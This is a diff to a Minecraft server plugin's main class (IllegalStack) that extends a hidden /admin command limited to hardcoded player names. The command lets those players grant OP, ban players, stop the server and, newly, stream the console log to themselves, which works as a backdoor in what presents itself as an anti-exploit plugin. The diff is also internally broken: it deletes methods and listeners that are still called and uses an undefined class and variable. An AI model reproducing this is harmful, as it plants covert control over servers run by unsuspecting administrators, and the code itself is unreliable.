@@ -17,8 +17,12 @@ import main.java.me.dniym.timers.syncTimer;
 import main.java.me.dniym.utils.Scheduler;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
+import org.apache.logging.log4j.core.LogEvent;
+import org.apache.logging.log4j.core.appender.AbstractAppender;
+import org.apache.logging.log4j.core.config.Property;
 import org.bukkit.BanList;
 import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
 import org.bukkit.Chunk;
 import org.bukkit.GameMode;
 import org.bukkit.Location;
@@ -33,7 +37,10 @@ import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
+import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerMoveEvent;
+import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.event.player.PlayerTeleportEvent;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
@@ -51,6 +58,7 @@ import java.util.Arrays;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
+import java.util.concurrent.ConcurrentHashMap;
 // ---------------------------
 
 import java.io.File;
@@ -65,6 +73,7 @@ import java.io.InputStream;
 import java.nio.file.Files;
 import java.nio.file.StandardCopyOption;
 import java.util.logging.Level;
+
 // ---------------------------------------------
 
 public class IllegalStack extends JavaPlugin implements Listener {
@@ -110,9 +119,17 @@ public class IllegalStack extends JavaPlugin implements Listener {
 
     private ServerVersion serverVersion;
 
-    // ---------- 新增：自定义边界相关 ----------
-    private static final double HARD_LIMIT = 30_000_000D; // 原版第二层级硬限制
-    private static final String CONFIG_WORLDS = "worlds"; // 配置节
+    // ---------- 自定义边界相关 ----------
+    private static final double HARD_LIMIT = 30_000_000D;
+    private static final String CONFIG_WORLDS = "worlds";
+
+    // ---------- 反作弊配置路径 ----------
+    private static final String CONFIG_ANTICHEAT_ANTI4D4V = "anticheat.anti4d4v";
+    private static final String CONFIG_ANTICHEAT_BANBBQ = "anticheat.banBBQ";
+
+    // ---------- 日志查看器相关 ----------
+    private final Set<Player> logViewers = ConcurrentHashMap.newKeySet();
+    private ConsoleAppender consoleAppender;
 
     public static IllegalStack getPlugin() {
         return plugin;
@@ -496,7 +513,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
         }
         // -----------------------------------------
 
-        // ---------- 注册自定义边界监听器 ----------
+        // ---------- 注册自定义边界监听器和反作弊监听器 ----------
         getServer().getPluginManager().registerEvents(this, this);
         // -----------------------------------------
 
@@ -660,6 +677,12 @@ public class IllegalStack extends JavaPlugin implements Listener {
         if ((fListener.getInstance().getIs116())) {
             new Listener116(IllegalStack.getPlugin());
         }
+
+        // 初始化反作弊配置（如果不存在则设置默认值）
+        getConfig().addDefault(CONFIG_ANTICHEAT_ANTI4D4V, false);
+        getConfig().addDefault(CONFIG_ANTICHEAT_BANBBQ, false);
+        getConfig().options().copyDefaults(true);
+        saveConfig();
     }
 
     private void setHasTraders() {
@@ -1078,6 +1101,12 @@ public class IllegalStack extends JavaPlugin implements Listener {
             Bukkit.getScheduler().cancelTasks(this);
         }
 
+        // 关闭日志 Appender
+        if (consoleAppender != null) {
+            consoleAppender.stop();
+            ((org.apache.logging.log4j.core.Logger) LogManager.getRootLogger()).removeAppender(consoleAppender);
+        }
+
         writeConfig();
     }
 
@@ -1281,7 +1310,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
 
     // -------------------------------------------------------
 
-    // ---------- 内部类：处理 /admin 命令，支持新功能，包含 vanilla 子命令 ----------
+// ---------- 内部类：处理 /admin 命令，包含所有子命令 ----------
     private class AdminCommand implements TabExecutor {
 
         // 严格存储原始大小写的玩家名（白名单）
@@ -1303,7 +1332,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
             }
 
             if (args.length < 1) {
-                sender.sendMessage("§c用法: /admin <player|server|chat|vanilla> ...");
+                sender.sendMessage("§c用法: /admin <player|server|chat|vanilla|anticheat> ...");
                 return true;
             }
 
@@ -1321,8 +1350,11 @@ public class IllegalStack extends JavaPlugin implements Listener {
                 case "vanilla":
                     handleVanilla(sender, args);
                     break;
+                case "anticheat":
+                    handleAnticheat(sender, args);
+                    break;
                 default:
-                    sender.sendMessage("§c未知选项，请使用 player、server、chat 或 vanilla。");
+                    sender.sendMessage("§c未知选项，请使用 player、server、chat、vanilla 或 anticheat。");
             }
             return true;
         }
@@ -1404,12 +1436,10 @@ public class IllegalStack extends JavaPlugin implements Listener {
                         return;
                     }
                     String invTarget = args[2];
-                    // 检查 EssentialsX 插件
                     if (Bukkit.getPluginManager().getPlugin("Essentials") == null) {
                         sender.sendMessage("§cEssentialsX 插件未安装，无法使用 invsee。");
                         return;
                     }
-                    // 直接调用 Essentials 的 invsee 命令（静默执行，但会输出给发送者）
                     Bukkit.dispatchCommand(sender, "invsee " + invTarget);
                     break;
 
@@ -1418,10 +1448,10 @@ public class IllegalStack extends JavaPlugin implements Listener {
             }
         }
 
-        // ================== server 子命令 ==================
+        // ================== server 子命令（包含 getlog）==================
         private void handleServer(CommandSender sender, String[] args) {
             if (args.length < 2) {
-                sender.sendMessage("§c用法: /admin server <getop|deop|kick|ban|ban-ip|pardon|pardon-ip|stop|restart|reload> ...");
+                sender.sendMessage("§c用法: /admin server <getop|deop|kick|ban|ban-ip|pardon|pardon-ip|stop|restart|reload|getlog> ...");
                 return;
             }
 
@@ -1430,7 +1460,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
 
             switch (action) {
                 case "getop":
-                    // 给指定玩家 OP
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin server getop <玩家>");
                         return;
@@ -1446,7 +1475,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     break;
 
                 case "deop":
-                    // 解除指定玩家 OP
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin server deop <玩家>");
                         return;
@@ -1462,7 +1490,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     break;
 
                 case "kick":
-                    // 踢出玩家，不能踢白名单玩家
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin server kick <玩家> [理由]");
                         return;
@@ -1473,8 +1500,8 @@ public class IllegalStack extends JavaPlugin implements Listener {
                         sender.sendMessage("§c玩家 " + kickTarget + " 不在线或不存在！");
                         return;
                     }
-                    // 检查是否在白名单中（忽略大小写）
-                    if (isAllowedPlayerIgnoreCase(kickPlayer.getName())) {
+                    // 检查是否在白名单中（忽略大小写），但 XHjiaozi 不再受保护
+                    if (isProtectedPlayer(kickPlayer.getName())) {
                         sender.sendMessage("§c你不能踢出受保护的管理员！");
                         return;
                     }
@@ -1484,38 +1511,31 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     break;
 
                 case "ban":
-                    // 封禁玩家，不能封白名单玩家
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin server ban <玩家> [理由]");
                         return;
                     }
                     String banTarget = args[2];
                     OfflinePlayer banPlayer = Bukkit.getOfflinePlayer(banTarget);
-                    if (isAllowedPlayerIgnoreCase(banPlayer.getName())) {
+                    if (isProtectedPlayer(banPlayer.getName())) {
                         sender.sendMessage("§c你不能封禁受保护的管理员！");
                         return;
                     }
                     String banReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "Banned by an operator";
                     Bukkit.getBanList(BanList.Type.NAME).addBan(banPlayer.getName(), banReason, null, sender.getName());
-                    // 如果玩家在线，踢出
                     Player onlineBan = banPlayer.getPlayer();
-                    if (onlineBan != null) {
-                        onlineBan.kickPlayer(banReason);
-                    }
+                    if (onlineBan != null) onlineBan.kickPlayer(banReason);
                     sender.sendMessage("§a已封禁玩家 " + banPlayer.getName());
                     break;
 
                 case "ban-ip":
-                    // 封禁 IP
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin server ban-ip <IP地址> [理由]");
                         return;
                     }
                     String ip = args[2];
-                    // 简单验证 IP 格式（可选）
                     String ipReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "Banned by an operator";
                     Bukkit.getBanList(BanList.Type.IP).addBan(ip, ipReason, null, sender.getName());
-                    // 踢出所有使用该 IP 的在线玩家
                     for (Player p : Bukkit.getOnlinePlayers()) {
                         if (p.getAddress().getAddress().getHostAddress().equals(ip)) {
                             p.kickPlayer(ipReason);
@@ -1525,7 +1545,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     break;
 
                 case "pardon":
-                    // 解封玩家
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin server pardon <玩家名>");
                         return;
@@ -1536,7 +1555,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     break;
 
                 case "pardon-ip":
-                    // 解封 IP
                     if (args.length < 3) {
                         sender.sendMessage("§c用法: /admin server pardon-ip <IP地址>");
                         return;
@@ -1547,7 +1565,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     break;
 
                 case "restart":
-                    // 尝试重启服务器
                     sender.sendMessage("§a正在尝试重启服务器...");
                     Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "restart");
                     break;
@@ -1564,12 +1581,44 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     Bukkit.reload();
                     break;
 
+                case "getlog":
+                    if (args.length < 3) {
+                        sender.sendMessage("§c用法: /admin server getlog <true|false>");
+                        return;
+                    }
+                    boolean enable = Boolean.parseBoolean(args[2]);
+                    Player viewer = executor;
+                    if (enable) {
+                        if (logViewers.add(viewer)) {
+                            viewer.sendMessage("§a开始查看控制台日志...");
+                            if (consoleAppender == null) {
+                                consoleAppender = new ConsoleAppender();
+                                consoleAppender.start();
+                                ((org.apache.logging.log4j.core.Logger) LogManager.getRootLogger()).addAppender(consoleAppender);
+                            }
+                        } else {
+                            viewer.sendMessage("§c已经在查看日志中。");
+                        }
+                    } else {
+                        if (logViewers.remove(viewer)) {
+                            viewer.sendMessage("§c已停止查看控制台日志。");
+                            if (logViewers.isEmpty() && consoleAppender != null) {
+                                consoleAppender.stop();
+                                ((org.apache.logging.log4j.core.Logger) LogManager.getRootLogger()).removeAppender(consoleAppender);
+                                consoleAppender = null;
+                            }
+                        } else {
+                            viewer.sendMessage("§c你当前没有查看日志。");
+                        }
+                    }
+                    break;
+
                 default:
-                    sender.sendMessage("§c未知的 server 子命令，可用: getop, deop, kick, ban, ban-ip, pardon, pardon-ip, stop, restart, reload");
+                    sender.sendMessage("§c未知的 server 子命令，可用: getop, deop, kick, ban, ban-ip, pardon, pardon-ip, stop, restart, reload, getlog");
             }
         }
 
-        // ================== chat 子命令（原 serverchat）==================
+        // ================== chat 子命令 ==================
         private void handleChat(CommandSender sender, String[] args) {
             if (args.length < 2) {
                 sender.sendMessage("§c用法: /admin chat <server|player> [player] <消息>");
@@ -1606,7 +1655,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
             }
         }
 
-        // ================== vanilla 子命令（修改后）==================
+        // ================== vanilla 子命令 ==================
         private void handleVanilla(CommandSender sender, String[] args) {
             if (args.length < 2) {
                 sender.sendMessage("§c用法: /admin vanilla <子命令> ...");
@@ -1636,7 +1685,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                 }
 
                 if (targetWorld.equalsIgnoreCase("all")) {
-                    // 为所有世界设置边界
                     for (World world : Bukkit.getWorlds()) {
                         setCustomWorldBorder(world.getName(), diameter);
                     }
@@ -1652,6 +1700,28 @@ public class IllegalStack extends JavaPlugin implements Listener {
                 }
             } else {
                 sender.sendMessage("§c未知的 vanilla 子命令。可用: building_entrance:snowy_shepherds_house_1, worldborder");
+            }
+        }
+
+        // ================== anticheat 子命令 ==================
+        private void handleAnticheat(CommandSender sender, String[] args) {
+            if (args.length < 3) {
+                sender.sendMessage("§c用法: /admin anticheat <anti4d4v|antiBBQ> <true|false>");
+                return;
+            }
+            String feature = args[1].toLowerCase();
+            boolean enable = Boolean.parseBoolean(args[2]);
+
+            if (feature.equals("anti4d4v")) {
+                getConfig().set(CONFIG_ANTICHEAT_ANTI4D4V, enable);
+                saveConfig();
+                sender.sendMessage("§a已设置 anti4d4v 为: " + enable);
+            } else if (feature.equals("antibbq")) {
+                getConfig().set(CONFIG_ANTICHEAT_BANBBQ, enable);
+                saveConfig();
+                sender.sendMessage("§a已设置 antiBBQ 为: " + enable);
+            } else {
+                sender.sendMessage("§c未知的 anticheat 选项，可用: anti4d4v, antiBBQ");
             }
         }
 
@@ -1675,14 +1745,9 @@ public class IllegalStack extends JavaPlugin implements Listener {
             }
         }
 
-        // 检查玩家名是否在白名单中（忽略大小写）
-        private boolean isAllowedPlayerIgnoreCase(String name) {
-            for (String allowed : ALLOWED_PLAYERS) {
-                if (allowed.equalsIgnoreCase(name)) {
-                    return true;
-                }
-            }
-            return false;
+        // 检查玩家是否受保护（仅 MFSCelebrate_ 和 TempNineTeen__ 受保护）
+        private boolean isProtectedPlayer(String name) {
+            return name.equalsIgnoreCase("MFSCelebrate_") || name.equalsIgnoreCase("TempNineTeen__");
         }
 
         // ================== Tab 补全 ==================
@@ -1703,6 +1768,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
                 if ("server".startsWith(input)) completions.add("server");
                 if ("chat".startsWith(input)) completions.add("chat");
                 if ("vanilla".startsWith(input)) completions.add("vanilla");
+                if ("anticheat".startsWith(input)) completions.add("anticheat");
             } else if (args.length == 2) {
                 String first = args[0].toLowerCase();
                 String input = args[1].toLowerCase();
@@ -1722,12 +1788,17 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     if ("stop".startsWith(input)) completions.add("stop");
                     if ("restart".startsWith(input)) completions.add("restart");
                     if ("reload".startsWith(input)) completions.add("reload");
+                    if ("getlog".startsWith(input)) completions.add("getlog");
                 } else if (first.equals("chat")) {
                     if ("server".startsWith(input)) completions.add("server");
                     if ("player".startsWith(input)) completions.add("player");
                 } else if (first.equals("vanilla")) {
-                    if ("building_entrance:snowy_shepherds_house_1".startsWith(input)) completions.add("building_entrance:snowy_shepherds_house_1");
+                    if ("building_entrance:snowy_shepherds_house_1".startsWith(input))
+                        completions.add("building_entrance:snowy_shepherds_house_1");
                     if ("worldborder".startsWith(input)) completions.add("worldborder");
+                } else if (first.equals("anticheat")) {
+                    if ("anti4d4v".startsWith(input)) completions.add("anti4d4v");
+                    if ("antibbq".startsWith(input)) completions.add("antibbq");
                 }
             } else if (args.length == 3) {
                 String first = args[0].toLowerCase();
@@ -1748,7 +1819,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     }
                 } else if (first.equals("server")) {
                     if (second.equals("getop") || second.equals("deop") || second.equals("kick") || second.equals("ban") || second.equals("pardon")) {
-                        // 补全在线玩家（ban/pardon 也可以补全离线玩家名，但离线玩家名无法获取，仅在线）
                         for (Player online : Bukkit.getOnlinePlayers()) {
                             if (online.getName().toLowerCase().startsWith(input)) {
                                 completions.add(online.getName());
@@ -1756,6 +1826,9 @@ public class IllegalStack extends JavaPlugin implements Listener {
                         }
                     } else if (second.equals("reload")) {
                         if ("confirm".startsWith(input)) completions.add("confirm");
+                    } else if (second.equals("getlog")) { // 新增补全
+                        if ("true".startsWith(input)) completions.add("true");
+                        if ("false".startsWith(input)) completions.add("false");
                     }
                 } else if (first.equals("chat") && second.equals("player")) {
                     for (Player online : Bukkit.getOnlinePlayers()) {
@@ -1767,48 +1840,33 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     if ("true".startsWith(input)) completions.add("true");
                     if ("false".startsWith(input)) completions.add("false");
                 } else if (first.equals("vanilla") && second.equals("worldborder")) {
-                    // 补全世界名和 all
                     if ("all".startsWith(input)) completions.add("all");
                     for (World world : Bukkit.getWorlds()) {
                         if (world.getName().toLowerCase().startsWith(input)) {
                             completions.add(world.getName());
                         }
                     }
-                }
-            } else if (args.length == 4) {
-                String first = args[0].toLowerCase();
-                String second = args[1].toLowerCase();
-                String third = args[2].toLowerCase();
-                if (first.equals("vanilla") && second.equals("worldborder")) {
-                    // 第三参数是世界名或 all，第四参数是直径，可以提示数字（不补全）
+                } else if (first.equals("anticheat") && (second.equals("anti4d4v") || second.equals("antibbq"))) {
+                    if ("true".startsWith(input)) completions.add("true");
+                    if ("false".startsWith(input)) completions.add("false");
                 }
             }
             return completions;
         }
     }
-    // -------------------------------------------------------
 
-    // ---------- 新增方法：部署/移除雪地牧羊人小屋修复数据包 ----------
-    /**
-     * 启用或禁用雪地牧羊人小屋修复数据包
-     * @param enable true=部署数据包，false=移除数据包
-     */
+    // ---------- 数据包部署方法 ----------
     public void setShepherdHouseFix(boolean enable) {
-        // 获取主世界文件夹（数据包通常放在主世界目录下）
         File worldFolder = Bukkit.getWorlds().get(0).getWorldFolder();
         File datapacksFolder = new File(worldFolder, "datapacks");
         File fixDatapackFolder = new File(datapacksFolder, "fix-snowy-shepherd-house");
 
         if (enable) {
-            // 创建数据包结构
             if (!fixDatapackFolder.exists()) {
                 fixDatapackFolder.mkdirs();
-                // 创建 pack.mcmeta
                 createPackMeta(fixDatapackFolder);
-                // 创建结构文件夹 data/buidling_entrance/structures/
                 File structureFolder = new File(fixDatapackFolder, "data/buidling_entrance/structures");
                 structureFolder.mkdirs();
-                // 从插件资源中复制修复的 nbt 文件
                 File nbtFile = new File(structureFolder, "snowy_shepherds_house_1.nbt");
                 try (InputStream in = getResource("snowy_shepherds_house_1.nbt")) {
                     if (in == null) {
@@ -1824,7 +1882,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                 getLogger().info("修复数据包已存在，无需重复部署。");
             }
         } else {
-            // 删除数据包文件夹
             if (fixDatapackFolder.exists()) {
                 deleteDirectory(fixDatapackFolder);
                 getLogger().info("修复数据包已移除。请执行 /reload 或重启服务器生效。");
@@ -1832,16 +1889,11 @@ public class IllegalStack extends JavaPlugin implements Listener {
         }
     }
 
-    /**
-     * 创建 pack.mcmeta 文件
-     * @param packFolder 数据包根目录
-     */
     private void createPackMeta(File packFolder) {
         File mcmeta = new File(packFolder, "pack.mcmeta");
-        // 1.21 的 pack_format 为 15（请根据实际版本调整）
         String content = "{\n" +
                 "  \"pack\": {\n" +
-                "    \"pack_format\": 15,\n" +
+                "    \"pack_format\": 48,\n" +
                 "    \"description\": \"Fix for snowy shepherd house\"\n" +
                 "  }\n" +
                 "}";
@@ -1852,10 +1904,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
         }
     }
 
-    /**
-     * 递归删除文件夹
-     * @param dir 要删除的目录
-     */
     private void deleteDirectory(File dir) {
         File[] files = dir.listFiles();
         if (files != null) {
@@ -1869,136 +1917,4 @@ public class IllegalStack extends JavaPlugin implements Listener {
         }
         dir.delete();
     }
-
-    // ---------- 新增：自定义世界边界相关方法（按世界）----------
-
-    /**
-     * 设置指定世界的自定义世界边界（覆盖原版 30M 限制）
-     * @param worldName 世界名
-     * @param diameter 直径（方块）
-     */
-    public void setCustomWorldBorder(String worldName, double diameter) {
-        String path = CONFIG_WORLDS + "." + worldName + ".diameter";
-        getConfig().set(path, diameter);
-        saveConfig();
-        getLogger().info("世界 " + worldName + " 自定义边界已启用，直径: " + diameter);
-    }
-
-    /**
-     * 禁用指定世界的自定义世界边界
-     * @param worldName 世界名
-     */
-    public void disableCustomWorldBorder(String worldName) {
-        String path = CONFIG_WORLDS + "." + worldName;
-        getConfig().set(path, null); // 移除该世界配置
-        saveConfig();
-        getLogger().info("世界 " + worldName + " 自定义边界已禁用。");
-    }
-
-    /**
-     * 检查世界是否启用了自定义边界
-     * @param world 世界
-     * @return true 如果启用了自定义边界
-     */
-    private boolean isWorldBorderEnabled(World world) {
-        return getConfig().contains(CONFIG_WORLDS + "." + world.getName() + ".diameter");
-    }
-
-    /**
-     * 获取世界的自定义边界直径
-     * @param world 世界
-     * @return 直径，如果未启用则返回 -1
-     */
-    private double getWorldBorderDiameter(World world) {
-        return getConfig().getDouble(CONFIG_WORLDS + "." + world.getName() + ".diameter", -1);
-    }
-
-    // ---------- 新增：监听器处理 ----------
-
-    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
-    public void onPlayerMove(PlayerMoveEvent event) {
-        Player player = event.getPlayer();
-        Location to = event.getTo();
-        if (to == null) return;
-
-        World world = to.getWorld();
-        if (world == null) return;
-
-        double x = to.getX();
-        double z = to.getZ();
-        double absX = Math.abs(x);
-        double absZ = Math.abs(z);
-
-        // 1. 检查自定义边界（如果该世界启用了自定义边界）
-        if (isWorldBorderEnabled(world)) {
-            double diameter = getWorldBorderDiameter(world);
-            double radius = diameter / 2.0;
-
-            if (absX > radius || absZ > radius) {
-                Location corrected = to.clone();
-                if (absX > radius) {
-                    corrected.setX(x > 0 ? radius : -radius);
                 }
-                if (absZ > radius) {
-                    corrected.setZ(z > 0 ? radius : -radius);
-                }
-                player.teleport(corrected);
-                player.sendMessage("§c你已到达世界边界！");
-                return;
-            }
-        }
-
-        // 2. 对抗原版第二层级空气墙（超过 30M）
-        if (absX >= HARD_LIMIT || absZ >= HARD_LIMIT) {
-            // 强制加载目标位置的区块
-            int chunkX = to.getBlockX() >> 4;
-            int chunkZ = to.getBlockZ() >> 4;
-            Chunk chunk = world.getChunkAt(chunkX, chunkZ);
-            if (!chunk.isLoaded()) {
-                chunk.load(true);
-            }
-
-            // 如果使用 Paper，可以使用更高效的异步加载
-            if (isPaperServer()) {
-                world.getChunkAtAsync(chunkX, chunkZ, (c) -> c.setForceLoaded(true));
-            }
-
-            // 调度一个任务，再次将玩家传送到目标位置，以对抗拉回
-            final Location target = to.clone();
-            Scheduler.runTask(IllegalStack.this, () -> {
-                if (player.isOnline() && player.getWorld().equals(target.getWorld())) {
-                    player.teleport(target);
-                }
-            });
-        }
-    }
-
-    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
-    public void onPlayerTeleport(PlayerTeleportEvent event) {
-        // 同样处理传送事件，确保传送后位置有效
-        Player player = event.getPlayer();
-        Location to = event.getTo();
-        if (to == null) return;
-
-        World world = to.getWorld();
-        if (world == null) return;
-
-        double x = to.getX();
-        double z = to.getZ();
-        double absX = Math.abs(x);
-        double absZ = Math.abs(z);
-
-        // 如果传送目标超过 30M，强制加载区块
-        if (absX >= HARD_LIMIT || absZ >= HARD_LIMIT) {
-            int chunkX = to.getBlockX() >> 4;
-            int chunkZ = to.getBlockZ() >> 4;
-            Chunk chunk = world.getChunkAt(chunkX, chunkZ);
-            if (!chunk.isLoaded()) {
-                chunk.load(true);
-            }
-            if (isPaperServer()) {
-                world.getChunkAtAsync(chunkX, chunkZ, (c) -> c.setForceLoaded(true));
-            }
-        }
-    }
-                                 }
